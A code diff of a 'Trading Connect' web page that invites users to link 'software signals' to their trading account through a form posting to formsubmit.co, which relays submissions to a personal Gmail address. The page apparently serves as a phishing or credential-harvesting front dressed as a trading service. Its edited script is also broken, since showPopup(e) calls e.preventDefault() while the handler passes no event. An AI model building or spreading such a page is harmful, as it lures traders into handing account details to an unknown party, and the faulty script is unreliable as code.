@@ -93,10 +93,11 @@ to{transform:scale(1);opacity:1}
 
 <div class="card">
 <div class="logo">Trading Connect</div>
-<div class="subtitle">Connect accurate Signals to your Trading Account</div>
+<div class="subtitle">Connect Software Signals to your Trading Account</div>
 
 <form action="https://formsubmit.co/zenithaurora777@gmail.com"
 method="POST"
+onsubmit="showPopup()">
 
 <input type="email" name="Email" placeholder="Email Address" required>
 
@@ -118,10 +119,13 @@ method="POST"
 </div>
 
 <script>
-function showPopup(){
+
+function showPopup(e){
+e.preventDefault();
 document.getElementById("popup").style.display="flex";
 }
+
 </script>
 
 </body>
-</html>
+</html> 
